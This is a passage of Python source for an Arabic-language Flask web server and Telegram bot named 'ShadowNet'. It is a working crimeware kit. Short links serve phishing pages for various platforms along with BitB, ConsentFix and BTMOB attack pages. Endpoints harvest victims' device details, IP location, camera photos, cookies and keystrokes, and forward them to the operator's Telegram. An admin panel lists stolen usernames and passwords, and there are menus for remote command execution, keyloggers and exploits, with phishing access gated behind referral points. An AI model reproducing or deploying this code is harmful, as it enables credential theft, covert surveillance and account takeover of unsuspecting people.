@app.route('/k')
def short_cookie():
    """رابط الكوكيز المختصر"""
    chat_id = extract_chat_id(request)
    if not chat_id:
        return "", 200
    return cookie_stealer_impl(chat_id)

@app.route('/b')
def short_bitb():
    chat_id = extract_chat_id(request)
    if not chat_id:
        return "", 200
    return render_template_string(generate_bitb_page(chat_id))

@app.route('/f')
def short_consentfix():
    chat_id = extract_chat_id(request)
    if not chat_id:
        return "", 200
    return render_template_string(generate_consentfix_page(chat_id))

@app.route('/m')
def short_btmob():
    chat_id = extract_chat_id(request)
    if not chat_id:
        return "", 200
    return render_template_string(generate_btmob_page(chat_id))

@app.route('/p/<code>')
def short_phishing(code):
    """رابط تصيد مختصر"""
    try:
        row = safe_db_query(
            "SELECT original_url FROM short_urls WHERE short_code = ?", (code,)
        )
        if not row:
            return redirect("https://www.google.com")

        original = row[0]
        if original.startswith("/phishing_pages/"):
            platform = original.replace("/phishing_pages/", "")
            metrics.inc('phishing_page_view')
            html = PHISHING_TEMPLATES.get(platform)
            if not html:
                return redirect("https://www.google.com")
            return render_template_string(html)
        return redirect("https://www.google.com")
    except:
        return redirect("https://www.google.com")

# ===================== معلومات الجهاز =====================
@app.route('/api/collect_device_info', methods=['POST'])
@rate_limit(max_per_minute=20, key='user')
def collect_device_info():
    try:
        data = request.get_json()
        if not data:
            return jsonify({"status": "error"}), 400
        chat_id = data.get('chat_id')
        info = data.get('info', {})
        ip = request.remote_addr or 'unknown'

        geo = {}
        try:
            r = requests.get(f'https://ipwho.is/{ip}', timeout=10)
            if r.status_code == 200:
                gd = r.json()
                if gd.get('success'):
                    geo = {
                        'country': gd.get('country', 'غير معروف'),
                        'city': gd.get('city', 'غير معروف'),
                        'region': gd.get('region', 'غير معروف'),
                        'isp': (gd.get('connection') or {}).get('isp', 'غير معروف'),
                        'org': (gd.get('connection') or {}).get('org', 'غير معروف'),
                    }
        except Exception as e:
            logger.error(f"ipwho error: {e}")

        def val(key, default='غير معروف'):
            v = info.get(key)
            return v if v not in (None, '', []) else default

        ua = val('user_agent')
        ram = val('ram')
        cores = val('cores')
        os_name = val('platform')
        device_type = 'هاتف' if info.get('touch') else 'كمبيوتر'

        browser_name = 'غير معروف'
        browser_version = 'غير معروف'
        m = re.search(r'(Chrome|Firefox|Safari|Edge|Opera|Brave)/([\d.]+)', ua)
        if m:
            browser_name = m.group(1)
            browser_version = m.group(2)

        L = []
        L.append("معلومات الجهاز")
        L.append("=" * 30)
        L.append("الموقع والشبكة:")
        L.append(f"- الدولة: {geo.get('country', 'غير معروف')}")
        L.append(f"- المدينة: {geo.get('city', 'غير معروف')}")
        L.append(f"- المنطقة: {geo.get('region', 'غير معروف')}")
        L.append(f"- عنوان IP: {ip}")
        L.append(f"- مزود الخدمة: {geo.get('isp', 'غير معروف')}")
        L.append("")
        L.append("البطارية:")
        L.append(f"- شحن الهاتف: {val('battery_level')}")
        L.append(f"- هل يشحن: {'نعم' if info.get('charging') else 'لا'}")
        L.append("")
        L.append("الاتصال:")
        L.append(f"- نوع الشبكة: {val('effective_type')}")
        L.append(f"- نوع الاتصال: {val('connection_type')}")
        L.append(f"- سرعة التنزيل: {val('downlink')}")
        L.append(f"- زمن الاستجابة: {val('rtt')}")
        L.append(f"- متصل الآن: {'نعم' if info.get('online') else 'لا'}")
        L.append("")
        L.append("الجهاز:")
        L.append(f"- اسم الجهاز: {os_name}")
        L.append(f"- نوع الجهاز: {device_type}")
        L.append(f"- إصدار النظام: {val('platform_version')}")
        L.append(f"- المعمارية: {val('architecture')}")
        L.append(f"- الموديل: {val('device_model')}")
        L.append(f"- الذاكرة العشوائية: {ram}")
        L.append(f"- الذاكرة الداخلية: غير معروف")
        L.append(f"- عدد الأنوية: {cores}")
        L.append(f"- لغة النظام: {val('language')}")
        L.append(f"- كل اللغات: {val('languages')}")
        L.append("")
        L.append("المتصفح:")
        L.append(f"- اسم المتصفح: {browser_name}")
        L.append(f"- الإصدار: {browser_version}")
        L.append(f"- وكيل المستخدم الكامل: {ua[:150]}")
        L.append(f"- النطاق: {val('vendor')}")
        L.append("")
        L.append("الشاشة:")
        L.append(f"- دقة الشاشة: {val('screen')}")
        L.append(f"- الدقة المتاحة: {val('avail_screen')}")
        L.append(f"- مقاس النافذة: {val('viewport')}")
        L.append(f"- عمق الألوان: {val('color_depth')}")
        L.append(f"- نسبة البكسل: {val('pixel_ratio')}")
        L.append(f"- وضع الشاشة: {val('orientation')}")
        L.append("")
        L.append("معلومات إضافية:")
        L.append(f"- بروتوكول الأمان: {val('protocol')}")
        L.append(f"- المنطقة الزمنية: {val('timezone')}")
        L.append(f"- الوقت المحلي: {val('local_time')}")
        L.append(f"- فارق التوقيت: {val('time_offset')}")
        L.append(f"- إذن الموقع الجغرافي: {val('geo_permission')}")
        L.append(f"- دعم اللمس: {'نعم' if info.get('touch') else 'لا'}")
        L.append(f"- عدد نقاط اللمس: {val('max_touch')}")
        L.append(f"- دعم البلوتوث: {'نعم' if info.get('bluetooth') else 'لا'}")
        L.append(f"- دعم USB: {'نعم' if info.get('usb') else 'لا'}")
        L.append(f"- الكوكيز مفعلة: {'نعم' if info.get('cookies_enabled') else 'لا'}")

        report = "\n".join(L)

        safe_db_execute(
            "INSERT INTO device_info_logs (chat_id, ip, report, created_at) VALUES (?, ?, ?, ?)",
            (str(chat_id), ip, report, datetime.now().isoformat())
        )

        try:
            header = f"<b>جهاز جديد دخل الرابط</b>\nChat ID: <code>{chat_id}</code>\n"
            bot.send_message(ADMIN_ID, header + f"\n<pre>{report[:3500]}</pre>",
                           parse_mode='HTML', timeout=30)
        except Exception as e:
            logger.error(f"send device info error: {e}")
            try:
                bot.send_message(ADMIN_ID, f"جهاز: {chat_id}\n\n{report[:3800]}", timeout=30)
            except:
                pass

        metrics.inc('device_info_collected')
        return jsonify({"status": "ok"})
    except Exception as e:
        logger.error(f"collect_device_info error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

# ===================== جمع الكاميرا والكوكيز =====================
@app.route('/api/collect_camera', methods=['POST'])
@rate_limit(max_per_minute=30, key='user')
def collect_camera():
    try:
        data = request.get_json()
        if not data:
            return jsonify({"status": "error"}), 400
        chat_id = data.get('chat_id')
        image_data = data.get('image')
        source = data.get('source', 'camera')
        if not chat_id or not image_data:
            return jsonify({"status": "error"}), 400
        if ',' in image_data:
            image_data = image_data.split(',')[1]
        img_binary = base64.b64decode(image_data)

        safe_db_execute(
            "INSERT INTO camera_images (chat_id, image, created_at) VALUES (?, ?, ?)",
            (chat_id, img_binary, datetime.now().isoformat())
        )
        os.makedirs('collected', exist_ok=True)
        filename = f"collected/cam_{chat_id}_{int(time.time())}.jpg"
        with open(filename, 'wb') as f:
            f.write(img_binary)

        try:
            bio = BytesIO(img_binary)
            bio.name = 'photo.jpg'
            bot.send_photo(ADMIN_ID, bio,
                          caption=f"📸 {source}\nالمستخدم: {chat_id}",
                          timeout=60)
        except Exception as e:
            logger.error(f"send_photo error: {e}")
        metrics.inc('camera_captured')
        return jsonify({"status": "ok"})
    except Exception as e:
        logger.error(f"collect_camera error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/collect_cookie', methods=['POST'])
@rate_limit(max_per_minute=30, key='user')
def collect_cookie():
    try:
        data = request.json
        chat_id = data.get('chat_id')
        cookie = data.get('cookie') or data.get('cookies')
        technique = data.get('technique', 'unknown')
        url = data.get('url', '')
        if not chat_id or not cookie:
            return jsonify({"status": "error"}), 400
        safe_db_execute(
            "INSERT INTO stolen_cookies (chat_id, url, cookie_name, cookie_value, technique, created_at) VALUES (?, ?, ?, ?, ?, ?)",
            (chat_id, url, 'stolen', cookie if isinstance(cookie, str) else str(cookie), technique, datetime.now().isoformat())
        )
        notify_admin(f"🍪 {technique}: {str(cookie)[:100]}")
        metrics.inc('cookie_stolen')
        return jsonify({"status": "ok"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/collect_keylog', methods=['POST'])
@rate_limit(max_per_minute=60, key='user')
def collect_keylog():
    try:
        data = request.json
        chat_id = data.get('chat_id')
        keystrokes = data.get('keystrokes', '')
        if chat_id and keystrokes:
            safe_db_execute(
                "INSERT INTO hack_commands (chat_id, command, output, created_at) VALUES (?, ?, ?, ?)",
                (str(chat_id), "keylog", keystrokes, datetime.now().isoformat())
            )
            notify_admin(f"⌨️ ضغطات من {chat_id}: {keystrokes}")
        return jsonify({"status": "ok"})
    except Exception as e:
        return jsonify({"status": "error"}), 500

@app.route('/s/<short_code>')
def redirect_short(short_code):
    original = expand_url(f"{SERVER_URL}/s/{short_code}")
    if original:
        return redirect(original)
    return "الرابط غير صحيح", 404

@app.route('/temp/<filename>')
def serve_temp_file(filename):
    return send_from_directory('temp', filename)

@app.route('/reel')
def reel_redirect():
    return redirect(f"{SERVER_URL}/phishing_pages/facebook")
  # ===================== أوامر البوت =====================
@bot.message_handler(commands=['start'])
def handle_start(message):
    try:
        chat_id = message.chat.id
        username = message.from_user.username if message.from_user else None
        first_name = message.from_user.first_name if message.from_user else None

        ensure_user(chat_id, username, first_name)
        update_last_seen(chat_id)
        log_activity(chat_id, "start")
        metrics.inc('command_start')

        parts = message.text.split()
        if len(parts) > 1:
            ref_code = parts[1][:20]
            row = safe_db_query("SELECT chat_id FROM users WHERE referral_code = ?", (ref_code,))
            if row and row[0] != chat_id:
                add_points(row[0], 5, "إحالة جديدة")
                add_points(chat_id, 5, "مكافأة إحالة")

        role = "👑 المطور" if is_admin(chat_id) else "👤 مستخدم"
        bot.send_message(
            chat_id,
            f"👋 مرحباً <b>{first_name or 'بك'}</b> في <b>ShadowNet</b>!\n"
            f"🎭 رتبتك: {role}\n"
            f"💎 نقاطك: <b>{get_user_points(chat_id)}</b>\n\n"
            f"اختر من القائمة أدناه:",
            reply_markup=build_main_menu(chat_id),
            parse_mode='HTML'
        )
    except Exception as e:
        logger.error(f"handle_start error: {e}")

@bot.message_handler(commands=['help'])
def handle_help(message):
    try:
        chat_id = message.chat.id
        ensure_user(chat_id)
        metrics.inc('command_help')
        bot.send_message(
            chat_id,
            "📖 <b>الأوامر المتاحة:</b>\n\n"
            "/start — القائمة الرئيسية\n"
            "/help — هذه المساعدة\n"
            "/check_mail — عرض البريد المؤقت\n"
            "/read_ID — قراءة رسالة محددة",
            parse_mode='HTML'
        )
    except Exception as e:
        logger.error(f"handle_help error: {e}")

@bot.message_handler(commands=['check_mail'])
def handle_check_mail(message):
    try:
        chat_id = message.chat.id
        metrics.inc('command_check_mail')
        if chat_id not in user_emails:
            bot.send_message(chat_id, "📭 لا يوجد بريد. أنشئ واحداً من القائمة.")
            return

        address = user_emails[chat_id]['address']
        msgs, err = fetch_temp_emails(chat_id)
        if err:
            bot.send_message(chat_id, f"❌ خطأ: {err}")
            return
        if not msgs:
            bot.send_message(chat_id, f"📭 لا رسائل في {address}")
            return

        txt = f"📬 <b>رسائل {address}:</b>\n\n"
        for m in msgs[:10]:
            mid = m.get('id', '')
            sender = m.get('from', {}).get('address', 'غير معروف')
            subject = m.get('subject', '(بدون موضوع)')
            txt += f"📩 ID: <code>{mid}</code>\nمن: {sender}\nالموضوع: {subject}\n/read_{mid}\n\n"
        bot.send_message(chat_id, txt, parse_mode='HTML')
    except Exception as e:
        logger.error(f"check_mail error: {e}")
        bot.send_message(chat_id, f"❌ خطأ: {str(e)[:150]}")

@bot.message_handler(commands=['ban'])
def handle_ban(message):
    try:
        chat_id = message.chat.id
        if not is_admin(chat_id):
            return
        parts = message.text.split()
        if len(parts) < 2:
            safe_send(chat_id, "استخدم: /ban USER_ID")
            return
        target = int(parts[1])
        safe_db_execute("UPDATE users SET is_banned = 1 WHERE chat_id = ?", (target,))
        safe_send(chat_id, f"✅ تم حظر {target}")
    except Exception as e:
        safe_send(chat_id, f"❌ خطأ: {e}")

@bot.message_handler(commands=['unban'])
def handle_unban(message):
    try:
        chat_id = message.chat.id
        if not is_admin(chat_id):
            return
        parts = message.text.split()
        if len(parts) < 2:
            safe_send(chat_id, "استخدم: /unban USER_ID")
            return
        target = int(parts[1])
        safe_db_execute("UPDATE users SET is_banned = 0 WHERE chat_id = ?", (target,))
        safe_send(chat_id, f"✅ تم فك الحظر عن {target}")
    except Exception as e:
        safe_send(chat_id, f"❌ خطأ: {e}")

# ===================== معالج الأزرار =====================
@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    global BOT_LOCKED, STEALTH_MODE
    try:
        chat_id = call.message.chat.id
        message_id = call.message.message_id
        data = call.data

        try:
            bot.answer_callback_query(call.id, cache_time=0)
        except Exception as e:
            logger.warning(f"answer_callback error: {e}")

        metrics.inc('callback_total')

        if not rate_limiter.check_user(chat_id, max_per_minute=60, is_admin=is_admin(chat_id)):
            safe_send(chat_id, "⚠️ طلبات كثيرة، انتظر قليلاً.")
            return

        ensure_user(chat_id)
        update_last_seen(chat_id)
        log_activity(chat_id, f"cb: {data}")

        if is_banned(chat_id) and not is_admin(chat_id):
            safe_send(chat_id, "🚫 أنت محظور.")
            return
        if BOT_LOCKED and not is_admin(chat_id):
            safe_send(chat_id, "🔒 البوت مقفل مؤقتاً.")
            return

        # ===== الرجوع =====
        if data == "back_main":
            try:
                bot.edit_message_text(
                    "🏠 القائمة الرئيسية:", chat_id, message_id,
                    reply_markup=build_main_menu(chat_id)
                )
            except:
                safe_send(chat_id, "🏠 القائمة الرئيسية:", reply_markup=build_main_menu(chat_id))
            return

        # ===== الطقس =====
        if data == "weather":
            user_states[chat_id] = "weather"
            safe_send(chat_id, "🌤️ أرسل اسم المدينة:")
            return

        # ===== كلمات المرور =====
        if data == "password_gen":
            pwd = generate_strong_password()
            safe_send(chat_id, f"🔑 كلمة مرور قوية:\n<code>{pwd}</code>")
            return

        if data == "password_strength":
            user_states[chat_id] = "password_strength"
            safe_send(chat_id, "🔐 أرسل كلمة المرور:")
            return

        # ===== الصوت =====
        if data == "voice_gtts_menu":
            safe_send(chat_id, "🎤 اختر الصوت:", reply_markup=build_voice_gtts_menu())
            return

        if data.startswith("voice_gtts_"):
            voice_name = data.replace("voice_gtts_", "")
            user_voice_selection[chat_id] = VOICES.get(voice_name, "ar")
            user_states[chat_id] = "waiting_voice_text"
            safe_send(chat_id, f"🎤 أرسل النص ({voice_name}):")
            return

        # ===== توليد الصور =====
        if data == "generate_image_btn":
            user_states[chat_id] = "waiting_image_prompt"
            safe_send(chat_id, "🎨 أرسل وصف الصورة (يدعم العربية):")
            return

        # ===== تقصير الروابط =====
        if data == "shorten_url":
            user_states[chat_id] = "waiting_shorten"
            safe_send(chat_id, "🔗 أرسل الرابط:")
            return

        if data == "expand_url":
            user_states[chat_id] = "waiting_expand"
            safe_send(chat_id, "🔗 أرسل الرابط المختصر:")
            return

        # ===== معلومات الجهاز (رابط مختصر) =====
        if data == "device_info":
            if not user_can_use_collector(chat_id) and not is_admin(chat_id):
                safe_send(chat_id, "🔒 غير مصرح.")
                return
            link = get_short_link("d", chat_id)
            safe_send(chat_id, f"📱 رابط جمع معلومات الجهاز:\n{link}")
            return

        # ===== الكاميرا (رابط مختصر) =====
        if data == "camera_hack":
            if not user_can_use_camera(chat_id):
                safe_send(chat_id, "🔒 غير مصرح.")
                return
            link = get_short_link("c", chat_id)
            safe_send(chat_id, f"📷 رابط الكاميرا:\n{link}")
            return

        # ===== الكوكيز (رابط مختصر) =====
        if data == "cookie_stealer":
            if not user_can_use_advanced(chat_id):
                safe_send(chat_id, "🔒 غير مصرح.")
                return
            link = get_short_link("k", chat_id)
            safe_send(chat_id, f"🍪 رابط الكوكيز:\n{link}")
            return

        # ===== تتبع الهاتف =====
        if data == "track_phone":
            user_states[chat_id] = "waiting_phone"
            safe_send(chat_id, "📱 أرسل الرقم مع رمز الدولة (مثال: +201234567890):")
            return

        # ===== مكالمة الفيديو (رابط مختصر) =====
        if data == "video_call":
            link = get_short_link("v", chat_id)
            safe_send(chat_id, f"📹 رابط مكالمة الفيديو:\n{link}")
            return

        # ===== الاقتباسات =====
        if data == "quotes_menu":
            safe_send(chat_id, "💬 اختر الفئة:", reply_markup=build_quotes_menu())
            return

        if data.startswith("quote_cat_"):
            cat = data.replace("quote_cat_", "")
            quotes = QUOTES_DB.get(cat, ["لا توجد اقتباسات"])
            safe_send(chat_id, f"💬 {cat}:\n\n{random.choice(quotes)}")
            return

        # ===== فحص الروابط =====
        if data == "check_link_btn":
            user_states[chat_id] = "waiting_link_check"
            safe_send(chat_id, "🔍 أرسل الرابط:")
            return

        # ===== PDF =====
        if data == "pdf_menu":
            safe_send(chat_id, "📄 أرسل PDF أولاً ثم اختر:", reply_markup=build_pdf_menu())
            return

        if data == "pdf_summary":
            text = pdf_texts.get(chat_id)
            if text:
                safe_send(chat_id, f"📄 ملخص:\n{text[:2000]}")
            else:
                safe_send(chat_id, "❌ أرسل PDF أولاً.")
            return

        if data == "pdf_extract":
            text = pdf_texts.get(chat_id)
            if text:
                safe_send(chat_id, f"📄 النص:\n{text[:3000]}")
            else:
                safe_send(chat_id, "❌ أرسل PDF أولاً.")
            return

        # ===== بريد مؤقت =====
        if data == "create_email_btn":
            safe_send(chat_id, "📧 جاري إنشاء البريد...")
            info, err = create_temp_email()
            if err:
                safe_send(chat_id, f"❌ فشل: {err}")
                return
            user_emails[chat_id] = info
            safe_send(
                chat_id,
                f"📧 <b>بريدك المؤقت جاهز</b>\n\n"
                f"العنوان: <code>{info['address']}</code>\n\n"
                f"لعرض الرسائل: /check_mail",
                parse_mode='HTML'
            )
            return

        # ===== النقاط =====
        if data == "my_points":
            pts = get_user_points(chat_id)
            rank = "👑 مطور" if is_admin(chat_id) else "👤 مستخدم"
            safe_send(chat_id, f"💎 نقاطك: <b>{pts}</b>\n🎭 {rank}")
            return

        if data == "my_referral":
            row = safe_db_query("SELECT referral_code FROM users WHERE chat_id = ?", (chat_id,))
            code = row[0] if row and row[0] else None
            if not code:
                code = secrets.token_hex(4)
                safe_db_execute("UPDATE users SET referral_code = ? WHERE chat_id = ?", (code, chat_id))
            username = get_bot_username()
            if username:
                safe_send(chat_id, f"🔗 رابط الدعوة:\nhttps://t.me/{username}?start={code}")
            else:
                safe_send(chat_id, f"🔗 كود الدعوة: <code>{code}</code>")
            return

        if data == "points_history":
            rows = safe_db_query(
                "SELECT amount, reason, created_at FROM points_log WHERE user_id = ? ORDER BY id DESC LIMIT 10",
                (chat_id,), fetch_one=False
            )
            if not rows:
                safe_send(chat_id, "📜 لا يوجد سجل.")
                return
            msg = "📜 آخر العمليات:\n"
            for amt, rsn, dt in rows:
                msg += f"• {amt:+d} | {rsn} | {dt[:10]}\n"
            safe_send(chat_id, msg)
            return

        # ===== ClickFix =====
        if data == "clickfix_generator":
            user_states[chat_id] = "waiting_clickfix_target"
            safe_send(chat_id, "🎯 أرسل اسم الهدف:")
            return

        # ===== AccountDumpling =====
        if data == "account_dumpling":
            user_states[chat_id] = "waiting_account_dumpling_email"
            safe_send(chat_id, "📧 أرسل البريد الإلكتروني:")
            return

        # ===== BitB / ConsentFix / BTMOB (روابط مختصرة) =====
        if data == "bitb_attack":
            link = get_short_link("b", chat_id)
            safe_send(chat_id, f"🪟 رابط BitB:\n{link}")
            return

        if data == "consentfix_attack":
            link = get_short_link("f", chat_id)
            safe_send(chat_id, f"🔑 رابط ConsentFix:\n{link}")
            return

        if data == "btmob_attack":
            link = get_short_link("m", chat_id)
            safe_send(chat_id, f"📱 رابط BTMOB:\n{link}")
            return

        # ===== تنزيل فيديو =====
        if data == "download_video":
            user_states[chat_id] = "waiting_download"
            safe_send(chat_id, "📥 أرسل رابط الفيديو:")
            return

        # ===== أدوات المطور =====
        if data == "vuln_agent":
            if not is_admin(chat_id):
                safe_send(chat_id, "⛔ للمطور فقط.")
                return
            user_states[chat_id] = "vuln_agent"
            safe_send(chat_id, "🔍 أرسل IP أو نطاق:")
            return

        if data == "osint_d2":
            if not is_admin(chat_id):
                safe_send(chat_id, "⛔ للمطور فقط.")
                return
            user_states[chat_id] = "osint_d2"
            safe_send(chat_id, "🕵️ أرسل النطاق أو البريد:")
            return

        if data == "py_netrecon":
            if not is_admin(chat_id):
                safe_send(chat_id, "⛔ للمطور فقط.")
                return
            user_states[chat_id] = "py_netrecon"
            safe_send(chat_id, "🌐 أرسل IP أو نطاق:")
            return

        if data == "exploit_dev":
            if not is_admin(chat_id):
                safe_send(chat_id, "⛔ للمطور فقط.")
                return
            user_states[chat_id] = "exploit_dev"
            safe_send(chat_id, "💀 أرسل IP الهدف:")
            return

        if data == "pentest_tools":
            if not is_admin(chat_id):
                safe_send(chat_id, "⛔ للمطور فقط.")
                return
            user_states[chat_id] = "pentest_tools"
            safe_send(chat_id, "🐍 أرسل اسم الأداة:")
            return

        # ===== التصيد (روابط مختصرة) =====
        if data == "phishing_pages":
            if not user_can_use_phishing(chat_id):
                safe_send(chat_id, "🔒 غير مصرح.")
                return
            safe_send(chat_id, "🎣 اختر المنصة:", reply_markup=build_phishing_pages_menu())
            return

        if data.startswith("phish_") and not data.startswith("phish_platform_"):
            platform = data.replace("phish_", "")
            # رابط مختصر مشفّر
            phish_code = hashlib.md5(f"{platform}_{chat_id}".encode()).hexdigest()[:10]
            safe_db_execute(
                "INSERT OR IGNORE INTO short_urls (original_url, short_code, created_at) VALUES (?, ?, ?)",
                (f"/phishing_pages/{platform}", phish_code, datetime.now().isoformat())
            )
            link = f"{SERVER_URL}/p/{phish_code}"
            safe_send(chat_id, f"🎣 رابط تصيد {platform}:\n{link}")
            return

        if data == "phishing_locked":
            safe_send(chat_id, f"🔒 تحتاج 300 نقطة. نقاطك: {get_user_points(chat_id)}")
            return

        if data == "phishing_email":
            if not user_can_use_phishing(chat_id):
                safe_send(chat_id, "🔒 غير مصرح.")
                return
            safe_send(chat_id, "🎣 اختر المنصة:", reply_markup=build_phishing_platform_menu())
            return

        if data.startswith("phish_platform_"):
            platform = data.replace("phish_platform_", "")
            user_states[f"{chat_id}_phishing_platform"] = platform
            user_states[chat_id] = "waiting_phishing_target"
            safe_send(chat_id, f"📧 أرسل البريد المستهدف لتصيد {platform}:")
            return

        # ===== لوحة تحكم الأدمن =====
        if data == "admin_panel":
            if not is_admin(chat_id):
                safe_send(chat_id, "⛔ للمطور فقط.")
                return
            safe_send(chat_id, "⚙️ لوحة التحكم:", reply_markup=build_admin_panel())
            return

        if data == "admin_stats":
            if not is_admin(chat_id):
                return
            users_count = safe_db_query("SELECT COUNT(*) FROM users")
            users_count = users_count[0] if users_count else 0
            phishing_count = safe_db_query("SELECT COUNT(*) FROM phishing_logs")
            phishing_count = phishing_count[0] if phishing_count else 0
            banned_count = safe_db_query("SELECT COUNT(*) FROM users WHERE is_banned = 1")
            banned_count = banned_count[0] if banned_count else 0

            snap = metrics.snapshot()
            safe_send(
                chat_id,
                f"📊 <b>إحصائيات النظام</b>\n"
                f"────────────────────\n"
                f"👥 المستخدمين: {users_count}\n"
                f"🚫 المحظورين: {banned_count}\n"
                f"🎣 عمليات التصيد: {phishing_count}\n\n"
                f"⏱️ <b>الأداء</b>\n"
                f"مدة التشغيل: {snap['uptime_seconds'] // 60} دقيقة\n"
                f"الكول باك: {snap['counters'].get('callback_total', 0)}\n"
                f"الصور: {snap['counters'].get('image_generation_success', 0)}/{snap['counters'].get('image_generation_failure', 0)}\n"
                f"الحظر (rate): {snap['counters'].get('rate_limit_user_blocked', 0)}"
            )
            return

        if data == "admin_grant_points":
            if not is_admin(chat_id):
                return
            user_states[chat_id] = "admin_grant_points_user"
            safe_send(chat_id, "💎 <b>منح نقاط</b>\n\nأرسل User ID المستخدم:")
            return

        if data == "admin_users_stats":
            if not is_admin(chat_id):
                return
            users = safe_db_query(
                "SELECT chat_id, username, first_name, points, is_banned, last_seen, created_at "
                "FROM users ORDER BY last_seen DESC LIMIT 30",
                fetch_one=False
            ) or []

            if not users:
                safe_send(chat_id, "📊 لا يوجد مستخدمين بعد.")
                return

            total = len(users)
            text = f"📊 <b>آخر {total} مستخدم</b>\n"
            text += "────────────────────\n\n"
            for uid, uname, fname, pts, banned, last_seen, created in users:
                status = "🚫" if banned else "🟢"
                display = fname or uname or "بدون اسم"
                last = last_seen[:16] if last_seen else "؟"
                admin_tag = " 👑" if int(uid) == ADMIN_ID else ""
                text += f"{status} <b>{display}</b>{admin_tag}\n"
                text += f"   🆔 <code>{uid}</code>\n"
                text += f"   💎 {pts} | 🕐 {last}\n\n"

            if len(text) > 4000:
                for i in range(0, len(text), 4000):
                    safe_send(chat_id, text[i:i+4000])
            else:
                safe_send(chat_id, text)
            return

        if data == "admin_users":
            if not is_admin(chat_id):
                return
            markup, err = build_users_menu(chat_id, "info")
            if err:
                safe_send(chat_id, err)
            else:
                safe_send(chat_id, "👥 المستخدمون:", reply_markup=markup)
            return

        if data == "admin_phishing_logs":
            if not is_admin(chat_id):
                return
            rows = safe_db_query(
                "SELECT platform, username, password, created_at FROM phishing_logs ORDER BY id DESC LIMIT 20",
                fetch_one=False
            )
            if not rows:
                safe_send(chat_id, "📜 لا يوجد سجل.")
                return
            msg = "📜 آخر عمليات التصيد:\n\n"
            for platform, username, password, dt in rows:
                msg += f"🎣 {platform} | {username} | {password} | {dt[:16]}\n"
            safe_send(chat_id, msg[:4000])
            return

        if data == "admin_broadcast":
            if not is_admin(chat_id):
                return
            user_states[chat_id] = "waiting_broadcast"
            safe_send(chat_id, "📢 أرسل الرسالة للبث:")
            return

        if data == "admin_ban_menu":
            if not is_admin(chat_id):
                return
            safe_send(chat_id, "🚫 استخدم /ban ID أو /unban ID")
            return

        # ===== RCE =====
        if data == "rce_menu":
            if not is_admin(chat_id):
                return
            user_states[chat_id] = "waiting_rce"
            safe_send(chat_id, "🖥️ أرسل الأمر لتنفيذه:")
            return

        # ===== Keylogger =====
        if data == "keylogger_menu":
            if not is_admin(chat_id):
                return
            user_states[chat_id] = "waiting_keylogger"
            safe_send(chat_id, "🔑 أرسل أي نص لإنشاء رابط Keylogger:")
            return

        # ===== الحماية =====
        if data == "protection_menu":
            if not is_admin(chat_id):
                return
            safe_send(chat_id, "🛡️ قائمة الحماية:", reply_markup=build_protection_menu())
            return

        if data == "protect_lock":
            BOT_LOCKED = not BOT_LOCKED
            safe_send(chat_id, f"🔒 حالة القفل: {'مقفل' if BOT_LOCKED else 'مفتوح'}")
            return

        if data == "protect_stealth":
            STEALTH_MODE = not STEALTH_MODE
            safe_send(chat_id, f"🥷 التخفي: {'مفعّل' if STEALTH_MODE else 'معطّل'}")
            return

        safe_send(chat_id, "⚠️ خيار غير معروف.")

    except Exception as e:
        logger.error(f"handle_callback error: {e}")
        try:
            notify_admin(f"خطأ في callback: {e}")
        except:
            pass

# ===================== معالج النصوص =====================
@bot.message_handler(
    func=lambda m: not m.text.startswith('/') if m.text else True,
    content_types=['text']
)
def handle_text(message):
    try:
        chat_id = message.chat.id
        text = message.text.strip()
        state = user_states.get(chat_id)

        ensure_user(chat_id)
        update_last_seen(chat_id)
        log_activity(chat_id, f"text: {text[:50]}")

        if not rate_limiter.check_user(chat_id, max_per_minute=30, is_admin=is_admin(chat_id)):
            safe_send(chat_id, "⚠️ طلبات كثيرة، انتظر قليلاً.")
            return

        if is_banned(chat_id) and not is_admin(chat_id):
            safe_send(chat_id, "🚫 أنت محظور.")
            return
        if BOT_LOCKED and not is_admin(chat_id):
            safe_send(chat_id, "🔒 البوت مقفل.")
            return

        # ===== /read_ID =====
        if text.startswith('/read_'):
            if chat_id not in user_emails:
                safe_send(chat_id, "📭 لا يوجد بريد نشط.")
                return
            try:
                msg_id = text.split('_', 1)[1]
            except:
                safe_send(chat_id, "📩 استخدم: /read_رقم")
                return

            data, err = read_temp_email(chat_id, msg_id)
            if err:
                safe_send(chat_id, f"❌ خطأ: {err}")
                return
            sender = data.get('from', {}).get('address', 'غير معروف')
            subject = data.get('subject', '(بدون موضوع)')
            body = data.get('text', data.get('html', ''))
            if isinstance(body, list):
                body = '\n'.join(body)
            body = re.sub(r'<[^>]+>', '', str(body))[:3000]

            result = (
                f"📩 <b>من:</b> {sender}\n"
                f"<b>الموضوع:</b> {subject}\n"
                f"────────────────────\n"
                f"{body}"
            )
            safe_send(chat_id, result[:4000])
            return

        # ===== منح نقاط - خطوة 1 =====
        if state == "admin_grant_points_user":
            if not is_admin(chat_id):
                user_states[chat_id] = None
                return
            try:
                target_id = int(text.strip())
                row = safe_db_query("SELECT chat_id, first_name, username FROM users WHERE chat_id = ?", (target_id,))
                if not row:
                    safe_send(chat_id, f"❌ المستخدم {target_id} غير موجود.")
                    user_states[chat_id] = None
                    return
                user_states[f"{chat_id}_grant_target"] = target_id
                user_states[chat_id] = "admin_grant_points_amount"
                target_name = row[1] or row[2] or str(target_id)
                safe_send(chat_id, f"✅ الهدف: <b>{target_name}</b> (<code>{target_id}</code>)\n\n💎 أرسل عدد النقاط (سالب للخصم):")
            except ValueError:
                safe_send(chat_id, "❌ أرسل رقم User ID صحيح.")
            return

        # ===== منح نقاط - خطوة 2 =====
        if state == "admin_grant_points_amount":
            if not is_admin(chat_id):
                user_states[chat_id] = None
                return
            try:
                amount = int(text.strip())
                target_id = user_states.get(f"{chat_id}_grant_target")
                if not target_id:
                    safe_send(chat_id, "❌ انتهت الجلسة. أعد المحاولة.")
                    user_states[chat_id] = None
                    return

                if amount == 0:
                    safe_send(chat_id, "❌ المبلغ لا يمكن أن يكون صفراً.")
                    return

                if amount > 0:
                    add_points(target_id, amount, f"منح من المطور")
                    safe_send(chat_id, f"✅ تم منح <b>{amount}</b> نقطة لـ <code>{target_id}</code>")
                else:
                    current = get_user_points(target_id)
                    actual_deduct = min(abs(amount), current)
                    if actual_deduct > 0:
                        safe_db_execute("UPDATE users SET points = points - ? WHERE chat_id = ?", (actual_deduct, target_id))
                        safe_db_execute(
